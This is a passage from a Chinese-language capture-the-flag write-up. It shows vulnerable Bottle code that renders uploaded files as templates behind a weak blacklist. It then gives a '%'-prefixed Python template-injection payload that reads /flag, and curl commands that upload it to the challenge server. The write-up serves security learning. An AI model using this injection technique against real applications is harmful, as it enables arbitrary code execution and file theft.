+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>view_file</span><span class=p>(</span><span class=n>md5</span><span class=p>,</span> <span class=n>filename</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=n>file_path</span> <span class=o>=</span> <span class=n>os</span><span class=o>.</span><span class=n>path</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=n>UPLOAD_DIR</span><span class=p>,</span> <span class=n>md5</span><span class=p>,</span> <span class=n>filename</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=ow>not</span> <span class=n>os</span><span class=o>.</span><span class=n>path</span><span class=o>.</span><span class=n>exists</span><span class=p>(</span><span class=n>file_path</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=s2>&#34;File not found.&#34;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=k>with</span> <span class=nb>open</span><span class=p>(</span><span class=n>file_path</span><span class=p>,</span> <span class=s1>&#39;r&#39;</span><span class=p>,</span> <span class=n>encoding</span><span class=o>=</span><span class=s1>&#39;utf-8&#39;</span><span class=p>)</span> <span class=k>as</span> <span class=n>f</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=n>content</span> <span class=o>=</span> <span class=n>f</span><span class=o>.</span><span class=n>read</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>contains_blacklist</span><span class=p>(</span><span class=n>content</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=s2>&#34;you are hacker!!!nonono!!!&#34;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=k>try</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>template</span><span class=p>(</span><span class=n>content</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=k>except</span> <span class=ne>Exception</span> <span class=k>as</span> <span class=n>e</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=sa>f</span><span class=s2>&#34;Error rendering template: </span><span class=si>{</span><span class=nb>str</span><span class=p>(</span><span class=n>e</span><span class=p>)</span><span class=si>}</span><span class=s2>&#34;</span>
+</span></span></code></pre></div><p>可以看到就是渲染的这里出了问题，由于黑名单设置得比较脆弱，会导致如果绕过了拦截，危险代码就会被执行；</p><ul><li>利用方法：</li></ul><p>在Bottle文档中有这样一段话：</p><blockquote><p>The template engine allows you to embed lines or blocks of python code within your template. Code lines start with <code>&lt;span class="pre">%&lt;/span></code> and code blocks are surrounded by <code>&lt;span class="pre">&lt;%&lt;/span></code> and <code>&lt;span class="pre">%>&lt;/span></code> tokens:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=o>%</span> <span class=n>name</span> <span class=o>=</span> <span class=s2>&#34;Bob&#34;</span>  <span class=c1># a line of python code</span>
+</span></span><span class=line><span class=cl><span class=o>&lt;</span><span class=n>p</span><span class=o>&gt;</span><span class=n>Some</span> <span class=n>plain</span> <span class=n>text</span> <span class=ow>in</span> <span class=n>between</span><span class=o>&lt;/</span><span class=n>p</span><span class=o>&gt;</span>
+</span></span><span class=line><span class=cl><span class=o>&lt;%</span>
+</span></span><span class=line><span class=cl>  <span class=c1># A block of python code</span>
+</span></span><span class=line><span class=cl>  <span class=n>name</span> <span class=o>=</span> <span class=n>name</span><span class=o>.</span><span class=n>title</span><span class=p>()</span><span class=o>.</span><span class=n>strip</span><span class=p>()</span>
+</span></span><span class=line><span class=cl><span class=o>%&gt;</span>
+</span></span><span class=line><span class=cl><span class=o>&lt;</span><span class=n>p</span><span class=o>&gt;</span><span class=n>More</span> <span class=n>plain</span> <span class=n>text</span><span class=o>&lt;/</span><span class=n>p</span><span class=o>&gt;</span>
+</span></span></code></pre></div><p>`</p></blockquote><p>bottle框架允许嵌入<code>Python</code>代码，代码行以%开头；</p><p>显然%并不在黑名单范围内</p><p>所以可以写<code>Python</code>代码：</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=o>%</span> <span class=kn>import</span> <span class=nn>fileinput</span>
+</span></span><span class=line><span class=cl><span class=o>%</span> <span class=n>m</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=n>fileinput</span><span class=o>.</span><span class=n>input</span><span class=p>(</span><span class=s1>&#39;/flag&#39;</span><span class=p>))</span>
+</span></span><span class=line><span class=cl><span class=o>%</span> <span class=k>raise</span> <span class=ne>Exception</span><span class=p>(</span><span class=n>m</span><span class=p>)</span>
+</span></span></code></pre></div><p>然后打包进<code>zip</code>；由于这里没有办法直接传包，只留了接口，所以用<code>curl</code>传下参（比赛中不知道为什么完全传不上去啊QAQ）</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>curl -X POST <span class=s2>&#34;http://gz.imxbt.cn:20568/upload&#34;</span> <span class=se>\
+</span></span></span><span class=line><span class=cl><span class=se></span>  -F <span class=s2>&#34;file=@exp.zip;type=application/zip;filename=exp.zip&#34;</span>
+</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>curl -X POST <span class=s2>&#34;http://gz.imxbt.cn:20568/upload&#34;</span> -F <span class=s2>&#34;file=@exp.zip;type=application/zip;filename=exp.zip&#34;</span>
+</span></span><span class=line><span class=cl>文件列表: exp.txt
+</span></span><span class=line><span class=cl>访问: /view/90767a02ed4bb2cd910c1f0c30ecd340/exp.txt
+</span></span></code></pre></div><p>访问<code>http://gz.imxbt.cn:20568/view/90767a02ed4bb2cd910c1f0c30ecd340/exp.txt</code>得到flag</p></section><footer class=article-footer><section class=article-copyright><svg class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><path d="M14.5 9a3.5 4 0 100 6"/></svg>
+<span>Licensed under CC BY-NC-SA 4.0</span></section></footer></article><aside class=related-content--wrapper><h2 class=section-title>相关文章</h2><div class=related-content><div class="flex article-list--tile"><article><a href=/p/cve-2024-39907%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/><div class=article-details><h2 class=article-title>CVE-2024-39907漏洞复现</h2></div></a></article><article><a href=/p/tls-poison-%E6%94%BB%E5%87%BB%E5%AD%A6%E4%B9%A0/><div class=article-details><h2 class=article-title>TLS Poison 攻击学习</h2></div></a></article><article><a href=/p/cve-2025-55449%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/><div class=article-details><h2 class=article-title>CVE-2025-55449漏洞复现</h2></div></a></article><article><a href=/p/cve-2025-2945-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/><div class=article-details><h2 class=article-title>CVE-2025-2945 漏洞复现</h2></div></a></article><article><a href=/p/tgctf%E7%9F%A5%E8%AF%86%E6%A2%B3%E7%90%86/><div class=article-details><h2 class=article-title>TGCTF知识梳理</h2></div></a></article></div></div></aside><footer class=site-footer><section class=copyright>&copy;
+2024 -
+2026 Oight</section><section class=powerby>Build by Oight<br>使用 <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a> 构建<br>主题 <b><a href=https://github.com/CaiJimmy/hugo-theme-stack target=_blank rel=noopener data-version=3.30.0>Stack</a></b> 由 <a href=https://jimmycai.com target=_blank rel=noopener>Jimmy</a> 设计</section></footer><div class=pswp tabindex=-1 role=dialog aria-hidden=true><div class=pswp__bg></div><div class=pswp__scroll-wrap><div class=pswp__container><div class=pswp__item></div><div class=pswp__item></div><div class=pswp__item></div></div><div class="pswp__ui pswp__ui--hidden"><div class=pswp__top-bar><div class=pswp__counter></div><button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+<button class="pswp__button pswp__button--share" title=Share></button>
+<button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+<button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button><div class=pswp__preloader><div class=pswp__preloader__icn><div class=pswp__preloader__cut><div class=pswp__preloader__donut></div></div></div></div></div><div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap"><div class=pswp__share-tooltip></div></div><button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+</button>
+<button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)"></button><div class=pswp__caption><div class=pswp__caption__center></div></div></div></div></div><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo=" crossorigin=anonymous defer></script><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU=" crossorigin=anonymous defer></script><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css crossorigin=anonymous><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css crossorigin=anonymous></main></div><script src=https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z+KMkF24hUW8WePSA9HM=" crossorigin=anonymous></script><script type=text/javascript src=/ts/main.1e9a3bafd846ced4c345d084b355fb8c7bae75701c338f8a1f8a82c780137826.js defer></script><script>(function(){const e=document.createElement("link");e.href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap",e.type="text/css",e.rel="stylesheet",document.head.appendChild(e)})()</script><script>(function(){const t=420;function e(){document.querySelectorAll(".article-content .highlight").forEach(function(e){if(e.dataset.codeFoldInit==="true")return;if(e.dataset.codeFoldInit="true",e.scrollHeight<=t+40)return;const s=document.createElement("div");s.className="code-fold-wrapper",e.parentNode.insertBefore(s,e),s.appendChild(e),e.classList.add("code-collapsible","code-collapsed");const n=document.createElement("button");n.type="button",n.className="code-toggle-button",n.textContent="展开代码",n.setAttribute("aria-expanded","false"),n.addEventListener("click",function(){const t=e.classList.toggle("code-collapsed");n.textContent=t?"展开代码":"收起代码",n.setAttribute("aria-expanded",String(!t))}),s.appendChild(n)})}document.readyState==="loading"?document.addEventListener("DOMContentLoaded",e):e()})()</script></body></html>
